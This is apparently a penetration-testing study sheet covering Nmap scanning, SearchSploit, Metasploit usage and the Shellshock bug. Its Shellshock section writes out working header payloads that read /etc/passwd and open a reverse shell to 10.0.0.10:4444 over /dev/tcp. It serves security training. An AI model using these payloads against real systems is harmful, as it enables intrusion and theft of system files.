## Pen Test: Intelligence Gathering and Exploitation.

- Use Searchsploit to research exploits and scripts related to Heartbleed.
- Identify hosts vulnerable to Heartbleed.
- Use Metasploit to exploit Heartbleed and Shellshock.
- Perform intense scans of target hosts using Zenmap.
- Identify specific vulnerabilities like Shellshock using Nmap NSE.
- Send injection payloads to vulnerable servers using Burp Repeater.Key Commands

#### Key Commands

Nmap

Nmap is a network scanning tool that is used extensively during the Intelligence Gathering stage of a penetration test. It has many options and the most commonly used are listed for your convenience.


SYN Scan

You can run a SYN scan using the following command:

nmap -sS <Target IP Address>

UDP Port Scan

You can run a UDP scan against specific ports with the following command:

# Running a UDP scan against ports 53, 67, 68 and 69
nmap -sU -p53,67,68,69 <Target IP Address>

Banner Grabbing with nmap

You can perform service and version detection using the -sV flag:

nmap -sV <IP Address>
You can also use the --script=banner option:

nmap -sV --script=banner <IP Address>

Vulnerability Scanning with nmap

nmap has a vulnerability scanning function / extension that is easy to install and use.

To install --script-vulners option:

curl -o /usr/share/nmap/scripts/vulners.nse https://raw.githubusercontent.com/vulnersCom/nmap-vulners/master/vulners.nse
Using --script-vulners:

nmap -sV --script-vulners <IP Address>

Run a ping sweep

An Nmap command to perform a ping sweep of the range 10.0.0.0 to 10.0.0.254.

#This reveals the hosts 10.0.0.10, 10.0.0.100, and 10.0.0.101.
nmap -sP 10.0.0.0-254.
Use Nmap to perform a ping sweep of your subnet. Save the results as XML.

#Save the results as /tmp/host_discovery
nmap -sP 10.0.0.0/24 -oX /tmp/host_discovery

Top Ports

Use --top-ports to scan the top 100 ports of the live hosts you discovered above.

nmap --top-ports 100 10.0.0.10 10.0.0.100-101

Check for ShellShock

Check to see if a host is vulnerable to ShellShock

# Scan 172.16.0.2 for ShellShock
$ nmap -sV -p- --script http-shellshock 172.16.0.2

Agressive Scan

Run an "aggressive" scan of the top 100 ports against the hosts in a list file. Options range between T1 (stelth) and T5 (Very Agressive) with T4 used as a default.

# Run a scan against the file /tmp/live_hosts
nmap --top-ports 100 -T4 -i /tmp/live_hosts

Turn off Ping and DNS

Repeat the scan above on just one of the hosts on the network. This time, turn off host discovery and name resolution to reduce the amount of traffic you send.

# Scan 10.0.0.100 turning off Ping and DNS scans
nmap --top-ports 100 -T4 10.0.0.100 -Pn -n

Use the default scripts

Use the default set of nmap scripts to scan a host

# Scan host 172.16.1.45 with the default scripts
nmap -sC 172.16.1.45

  Expand for Explanations of more Nmap Flags
  
    
-oXSave scan output to an XML file
    

-oNSave scan output to a txt file
    

-sPPing Sweep
    

-sS SYN Scan (TCP by default)
    

-sU UDP Scan
    

-sV Banner Grab
    

-p Specify port(s)
  


        


ShellShock

Bash does not sanitize headers before loading them as environment variables. This means it loads whatever value is sent in the header. For example, the request below results in HTTP_USER_AGENT being set to () { :;};. This is cryptic, but in vulnerable versions of Bash, this creates a function that does nothing.

GET /index.html HTTP/1.1
Host: example.com
User-Agent: () { :;};
Connection: keep-alive
Therefore, if you update the request above to the below, the server will run echo "haxxed".

  GET /index.html HTTP/1.1
  Host: example.com
  User-Agent: () { :;}; echo "haxxed"
  Connection: keep-alive
This allows you to execute arbitrary code on the server, including commands that open TCP connections back to your machine.

  GET /index.html HTTP/1.1
  Host: example.com
  User-Agent: () { :;}; /bin/bash -c "cat /etc/passwd"
  Connection: keep-alive

ShellShock Payload to Open a Shell Breakdown

# Here is a Shellshock Payload Example
User-Agent: () { :;};echo -e "\r\n$(/bin/bash -i >& /dev/tcp/10.0.0.10/4444 0>&1)"`.

User-Agent: () { :;}; exploits Shellshock by creating a function. The code after gets executed by the shell.
echo -e "\r\n$(/bin/bash -i >& /dev/tcp/10.0.0.10/4444 0>&1)":
/bin/bash -i >& /dev/tcp/10.0.0.10/444 means "Run a new Bash shell in interactive mode. Send std error and standard output to 10.0.0.10:4444 through a TCP connection.
0>&1 means "Read standard input (0) to this new shell through the TCP connection."



SearchSploit

SearchSploit allows you to search all of the exploits that you have in Kali Linux and even view their source code.


Search for exploits

# Search for apache exploits and view the first 10 findings.
searchsploit apache | head

View Source Code

# View the source code for the 29316.py exploit
searchsploit -x exploits/php/remote/29316.py

MetaSploit

MetaSploit is an automated explanation tool. In the professional pentesting world, is has a bit of a stigma because it allows users to run exploits without fully understanding what they are doing. Many Job Interviews and Pentesting Engagements will not allow the use of Metasploit. Before using Metasploit, it is important to understand what exploits you are running and what they do.


Start Metasploit

# Start the database
msfdb init

# Start msfconsole
msfconsole

Search Metasploit

Search Metasploit for a Hearbleed Exploit

msf > search heartbleed

Use an Exploit

Load an exploit that you discovered with Metasploit

msf > use /path/to/exploit
View an exploit's options

msf exploit(/path/to/exploit) > show options
Set an option with set <OPTION> <PARAMETER>

# Set the RHOSTS option to 172.16.1.33
msf exploit(/path/to/exploit) > set RHOSTS 172.16.1.33
Check if an exploit is likely to work:

msf /path/to/exploit > check
Execute an exploit

msf /path/to/exploit > run
Change the payload of an exploit

msf /path/to/exploit > set PAYLOAD /path/to/payload
